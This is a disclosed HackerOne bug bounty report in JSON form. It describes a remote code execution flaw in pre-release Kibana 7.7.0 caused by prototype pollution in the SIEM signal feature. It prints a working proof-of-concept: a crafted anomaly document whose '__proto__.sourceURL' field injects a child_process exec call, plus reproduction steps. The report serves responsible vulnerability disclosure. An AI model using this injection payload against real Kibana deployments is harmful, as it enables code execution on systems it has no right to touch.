{
  "id": 861744,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84NjE3NDQ=",
  "url": "https://hackerone.com/reports/861744",
  "title": "Remote Code Execution in coming Kibana 7.7.0",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "critical",
  "readable_substate": "Resolved",
  "created_at": "2020-04-28T19:28:40.828Z",
  "submitted_at": "2020-04-28T19:28:40.828Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "alexbrasetvik",
    "url": "/alexbrasetvik",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/AMYBseEiuZm6mtG4rfyRgTBu/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
    },
    "is_me?": false,
    "cleared": true,
    "verified": true,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 23607,
    "url": "https://hackerone.com/elastic",
    "handle": "elastic",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/607/c5cce6a2e2d95af85e014db95c2d7560e73e9bec_original./235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/607/c5cce6a2e2d95af85e014db95c2d7560e73e9bec_original./3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "pentest_retesting_ends_at": null,
    "profile": {
      "name": "Elastic",
      "twitter_handle": "elastic",
      "website": "https://www.elastic.co/",
      "about": "Smarter search. Stronger security. Seamless observability. Uncover real-time insights with Search AI."
    }
  },
  "has_bounty?": true,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "submitted_with_assistant": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2021-04-19T21:46:03.513Z",
  "bug_reporter_agreed_on_going_public_at": "2021-04-19T21:02:15.954Z",
  "team_member_agreed_on_going_public_at": "2021-04-19T21:46:03.386Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "**Summary:**\n\nKibana 7.7.0 as per commit [c5f682cb](https://github.com/elastic/kibana/commits/c5f682cb) is vulnerable to a remote code execution vulnerability that is similar to the one reported in https://hackerone.com/reports/852613\n\nKibana 7.7.0 is not released, so this is an experiment. I know that getting these reports is more valuable to Elastic prior to a release, as the amount of work growing out of a critical vulnerability like this is a lot more _after_ release. It could possibly be more valuable for me to wait until Cloud actually has the release and clearly is in scope, but I have faith in you wanting to encourage people to actually look at code whose release is imminent, so here's the report pre release.\n\nI saw that you have commited the fixes to my previous report: https://github.com/elastic/kibana/commit/68674568efac9070935f07e55dfd1a9f8482663d That fix is part of commit c5f682cb which the following is tested with.\n\n**Description:**\n\nThere is a prototype pollution in the new \"SIEM signal\" feature: https://github.com/elastic/kibana/blob/master/x-pack/plugins/siem/server/lib/detection_engine/signals/bulk_create_ml_signals.ts#L58\n\nThe attached recording shows how to exercise this code via a SIEM detection rule. The following JSON-blob is an export of the detection rule used:\n\n```\n{\"actions\":[],\"created_at\":\"2020-04-28T17:19:42.955Z\",\"updated_at\":\"2020-04-28T18:02:32.489Z\",\"created_by\":\"elastic\",\"description\":\"test\",\"enabled\":true,\"anomaly_threshold\":0,\"false_positives\":[],\"from\":\"now-108015s\",\"id\":\"ac26797b-9061-485c-889c-79993ca8e209\",\"immutable\":false,\"interval\":\"15s\",\"rule_id\":\"2a5a3f8e-79a9-4101-99d9-b414ed48c0db\",\"output_index\":\".siem-signals-default\",\"max_signals\":100,\"machine_learning_job_id\":\"linux_anomalous_network_activity_ecs\",\"risk_score\":50,\"name\":\"test\",\"references\":[],\"meta\":{\"from\":\"30h\",\"kibana_siem_app_url\":\"https://localhost:5601/app/siem\"},\"severity\":\"low\",\"updated_by\":\"elastic\",\"tags\":[],\"to\":\"now\",\"type\":\"machine_learning\",\"threat\":[],\"throttle\":\"no_actions\",\"version\":3}\n{\"exported_count\":1,\"missing_rules\":[],\"missing_rules_count\":0}\n```\n\nIf I create a fake ML-anomaly like follows, I can pollute the prototype:\n\n```\nPUT /.ml-anomalies-custom-linux_anomalous_network_activity_ecs/_doc/my-anomaly?refresh\n{\n  \"timestamp\": 1588093630045,\n  \"result_type\": \"record\",\n  \"record_score\": 1,\n  \"job_id\": \"linux_anomalous_network_activity_ecs\",\n  \"by_field_name\": \"field_name\",\n  \"by_field_value\": \"field_value\",\n  \"influencers\": [\n    {\"influencer_field_name\": \"foo.__proto__.sourceURL\", \"influencer_field_values\": \"\\u2028\\u2029\\n;global.process.mainModule.require('child_process').exec('say pwned && open https://www.youtube.com/watch?v=LUsiFV3dsK8')\"}\n    ]\n}\n```\n\nNote that the timestamp might need adjusting, as the SIEM rule only looks 30h back in the past as provided.\n\n## Steps To Reproduce:\n\n  1. Import the provided SIEM detection rule.\n  1. Create the fake anomaly provided above.\n  1. Enable the rule. Sometimes disabling and re-enabling it is necessary, which is probably a bug in itself.\n  1. Wait ~15 seconds for the rule to be evaluated, which should execute the code, which on a Mac will cause \"pwned\" to sound and the youtube clip to open.\n\n## Supporting Material/References:\n\n  * Video walkthrough attached.\n\n## Impact\n\nA user with write access to these indexes (like any Cloud user would have) can achieve full remote code execution.",
  "bounty_amount": "5000.0",
  "formatted_bounty": "$5,000",
  "weakness": {
    "id": 75,
    "name": "Privilege Escalation"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [
    {
      "id": 807361,
      "file_name": "Kibana_7.7.0_RCE.mp4",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/55puyEcV8KPhTFnnYKkAqgLY?response-content-disposition=attachment%3B%20filename%3D%22Kibana_7.7.0_RCE.mp4%22%3B%20filename%2A%3DUTF-8%27%27Kibana_7.7.0_RCE.mp4&response-content-type=video%2Fmp4&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQUZQVL74U%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T031221Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEIL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDMNSYRDeOy87S2xQnTrIfvaIuzUyy1X6unpY%2FbjQMkMQIhANDgljLlIAnjgHp8ycPipe%2F5gZVfZIBjvmQSjJBNed2OKroFCPv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5IgyVf2aCR8nAOKLHLKgqjgUozMQMVJthduJNdRKDp%2B%2Be9XXS5g0IktvStfd0ADR3L%2Fy8XHBP4VF2abJC5ROgao1t6lEinoc9K29YGXE0OYLYJ2LpBmPHeHyGM6%2BAXVDwDuzNZKnh7qQw2jtTLmov86C5YDyzNgBThqefBLaHmK5m1l0sP%2FZ81SvHwUW2qZZZGKDtybMowDB90XBHv10kvNSr3ZfJ6smrwfessgt9Tmqoq9yYGGDt8ZyFVmrWznNhAJJGY1qUy79fXa0Q50YVbxFtm35zZ%2FkSxBHnGgsBgDfWQe7ge1CeqqKNhqlcoU1I3GtiuC6AdMpk5b4eKnxngLTJZ%2BzTmF5DEtSuqGCbiUAAa%2Fq0OS6NUZuJNRdQ1G03%2FCa9CyPR3uaC7nO1G%2BXugA%2Fd6m%2FEOoj8ODuXz5iLfPoxUFk6FDb3GpapcNRAJwj1lxu4kjbHEMcKqA8rTKwrBkbiumhPLw6zWLworIfX7uY06Mqrcmgq0yUCCXpe%2F%2BSpssGZiDV5plUzAFODQk%2BgGEDLorn0zsjOB5vzQGShAMovtveYauOw1bKd6kSN8L%2BwvV1aOEpM53Em0On8HpzvES23EVbGRHaftnOEqOerMvKzkbvoN57FH6SfwRw6pZhS6OxChk6XPmWWb1MUZ9SFimVCFSUZ0Oel7rn6OgmK2fYi3aNNrmOzZrvu%2Fl3z96Qsv2Ur%2FNjAsoZarCaP9c4ypblQC262HTivtOPAHJK%2BmR0djPPIZBNw3he34i9myBVuc348fBFroNF15YAkREymeuBeyZa8OoxNjN172r1VmjXRI9sDHgKffg0Cia8b27yMvSJqvLoYduAc%2FyaMZQlY44y%2BcnEhmsUAxOYiHPbTl1gLt2LF%2BsWQ81QPbjjvd6sw%2BbK9xgY6sAGgIanUFqhXlb0UuPjs3CEllXYIwRuv2reO7b%2BUuvJ3u2pa4n1wokz4itFJg6%2B8ieyDgbyaXYkvFvF71VzpMUuChDzU2v67t3Vm7iDfkhGCzv8h6HaP8FcES8X64mVc2nvmubDV9dI8piVTVtcTgjoUnXIxsQTwofAePLnaOum2ePtcpGR3TJh3x8GDZj3UY7Fok0R7RnOQlR4lbKZcHiUnMXf6z25IhjphCoFRG%2FWi9g%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=5f25a53f239df479ace82075faa3c8f6e944bfdf98382a31a63cf83e468f7215",
      "file_size": 13559026,
      "type": "video/mp4",
      "moderated": null
    }
  ],
  "allow_singular_disclosure_at": "2021-05-19T21:02:16.017Z",
  "allow_singular_disclosure_after": -136966205.52342665,
  "singular_disclosure_allowed": true,
  "vote_count": 13,
  "voters": [
    "alexbrasetvik",
    "0x_alibabas",
    "n1m0",
    "haxor31337",
    "dee-see",
    "trieulieuf9",
    "rzx007x",
    "aryan2808",
    "superman85",
    "naategh",
    "and 3 more..."
  ],
  "severity": {
    "rating": "critical",
    "author_type": "User"
  },
  "structured_scope": {
    "databaseId": 4424,
    "asset_type": "URL",
    "asset_identifier": "cloud.elastic.co",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
